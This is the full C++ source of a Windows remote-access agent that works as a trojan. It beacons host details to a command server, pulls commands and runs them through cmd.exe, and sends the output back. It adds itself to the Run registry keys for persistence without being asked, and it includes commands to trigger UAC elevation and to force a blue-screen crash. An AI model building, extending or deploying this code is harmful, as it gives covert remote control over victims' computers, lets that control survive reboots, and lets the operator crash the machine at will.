// agent.cpp
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include "json.hpp"
using json=nlohmann::json;

#pragma comment(lib,"winhttp.lib")
#pragma comment(lib,"shell32.lib")

std::string url_encode(const std::string& value){
    static const char hex[]="0123456789ABCDEF";std::string res;
    for(unsigned char c:value){
        if(isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~') res+=c;
        else if(c==' ') res+='+';
        else{res+='%';res+=hex[c>>4];res+=hex[c&15];}
    }return res;
}

std::string http_post(const std::wstring& host,const std::wstring& path,const std::string& data){
    HINTERNET s=WinHttpOpen(L"Agent/1.0",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,0,0,0);
    if(!s) return "";HINTERNET c=WinHttpConnect(s,host.c_str(),1143,0);
    if(!c){WinHttpCloseHandle(s);return "";}
    HINTERNET r=WinHttpOpenRequest(c,L"POST",path.c_str(),NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
    if(!r){WinHttpCloseHandle(c);WinHttpCloseHandle(s);return "";}
    LPCWSTR hdr=L"Content-Type: application/x-www-form-urlencoded";
    if(!WinHttpSendRequest(r,hdr,-1,(LPVOID)data.data(),(DWORD)data.size(),(DWORD)data.size(),0)){
        WinHttpCloseHandle(r);WinHttpCloseHandle(c);WinHttpCloseHandle(s);return "";}
    WinHttpReceiveResponse(r,0);std::string resp;DWORD sz=0;
    do{WinHttpQueryDataAvailable(r,&sz);if(sz){std::vector<char> buf(sz+1);DWORD rd=0;
        WinHttpReadData(r,buf.data(),sz,&rd);resp.append(buf.data(),rd);}}while(sz>0);
    WinHttpCloseHandle(r);WinHttpCloseHandle(c);WinHttpCloseHandle(s);return resp;
}

std::string load_id(){std::ifstream f("agent_id.txt");std::string id;if(f.is_open())std::getline(f,id);return id;}
void save_id(const std::string& id){std::ofstream f("agent_id.txt",std::ios::trunc);f<<id;}

int64_t now_ts(){return std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();}

bool is_admin(){return IsUserAnAdmin();}
bool can_uac(){
    BOOL isMember=FALSE;SID_IDENTIFIER_AUTHORITY NtAuth=SECURITY_NT_AUTHORITY;PSID g;
    if(AllocateAndInitializeSid(&NtAuth,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0,&g)){CheckTokenMembership(NULL,g,&isMember);FreeSid(g);}return isMember;
}
std::string get_computer(){char buf[MAX_COMPUTERNAME_LENGTH+1];DWORD sz=MAX_COMPUTERNAME_LENGTH+1;
    if(GetComputerNameA(buf,&sz)) return buf;return "unknown";}
std::string get_os(){OSVERSIONINFOEXA vi={0};vi.dwOSVersionInfoSize=sizeof(vi);
    if(GetVersionExA((OSVERSIONINFOA*)&vi)){std::ostringstream oss;oss<<"Windows "<<vi.dwMajorVersion<<"."<<vi.dwMinorVersion;return oss.str();}
    return "unknown";}

void add_startup(bool elevated){
    char path[MAX_PATH];GetModuleFileNameA(NULL,path,MAX_PATH);
    HKEY key;const char* run="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if(RegOpenKeyExA(HKEY_CURRENT_USER,run,0,KEY_SET_VALUE,&key)==ERROR_SUCCESS){
        RegSetValueExA(key,"Agent",0,REG_SZ,(BYTE*)path,(DWORD)(strlen(path)+1));RegCloseKey(key);}
    if(elevated){
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,run,0,KEY_SET_VALUE,&key)==ERROR_SUCCESS){
            RegSetValueExA(key,"Agent",0,REG_SZ,(BYTE*)path,(DWORD)(strlen(path)+1));RegCloseKey(key);}
    }
}

void exec_cmd(const std::string& cmd,std::function<void(const std::string&)> cb){
    if(cmd=="__UAC__"){
        if(is_admin()){cb("已是管理员");return;}
        if(!can_uac()){cb("当前用户无提权权限");return;}
        char path[MAX_PATH];GetModuleFileNameA(NULL,path,MAX_PATH);
        SHELLEXECUTEINFOA sei={sizeof(sei)};sei.lpVerb="runas";sei.lpFile=path;sei.nShow=SW_SHOWNORMAL;
        if(!ShellExecuteExA(&sei)) cb("UAC 请求失败"); else cb("触发 UAC，自重启中");ExitProcess(0);return;
    }
    if(cmd=="__BSOD__"){
        typedef NTSTATUS(WINAPI* RtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
        typedef NTSTATUS(WINAPI* NtRaiseHardError)(NTSTATUS,ULONG,ULONG,PULONG,ULONG,PULONG);
        auto Rtl=(RtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll"),"RtlAdjustPrivilege");
        auto NtErr=(NtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll"),"NtRaiseHardError");
        BOOLEAN b;ULONG r;if(Rtl) Rtl(19,TRUE,FALSE,&b);if(NtErr) NtErr(0xC0000022,0,0,0,6,&r);
        cb("蓝屏触发失败");return;}
    if(cmd=="__PERSIST__"){add_startup(is_admin());cb("已添加自启动");return;}
    std::string full="cmd.exe /C \""+cmd+"\" 2>&1";FILE* p=_popen(full.c_str(),"r");
    if(!p){cb("执行失败");return;}
    int64_t ts=now_ts();
    char buf[1024];
    while(fgets(buf,sizeof(buf),p)){std::string line(buf);
        if(!line.empty()&&(line.back()=='\n'||line.back()=='\r'))
            line.erase(line.find_last_not_of("\r\n")+1);cb(line);} _pclose(p);
}

int main(){
    std::wstring host=L"127.0.0.1"; // 改为服务端 IP
    std::wstring reg=L"/register",hb=L"/heartbeat",pull=L"/pull",res=L"/result";
    std::string id=load_id();if(id.empty()){
        std::string r=http_post(host,reg,"");try{auto j=json::parse(r);id=j["id"].get<std::string>();save_id(id);}catch(...){}
    }
    std::thread([](){std::this_thread::sleep_for(std::chrono::seconds(20));add_startup(is_admin());}).detach();
    while(true){
        std::ostringstream hbdata;hbdata<<"id="<<url_encode(id)<<"&priv="<<(is_admin()?"admin":"user")
            <<"&canuac="<<(can_uac()?"1":"0")<<"&comp="<<url_encode(get_computer())
            <<"&os="<<url_encode(get_os());
        http_post(host,hb,hbdata.str());
        std::string cmds=http_post(host,pull,"id="+url_encode(id));
        if(cmds.size()>2){try{auto arr=json::parse(cmds);for(auto& c:arr){
            std::string cmd=c.get<std::string>();int64_t ts=now_ts();
            exec_cmd(cmd,[&](const std::string& line){
                std::ostringstream oss;oss<<"id="<<url_encode(id)<<"&output="<<url_encode(line)<<"&ts="<<ts;
                http_post(host,res,oss.str());});}}catch(...){}} std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }return 0;
}
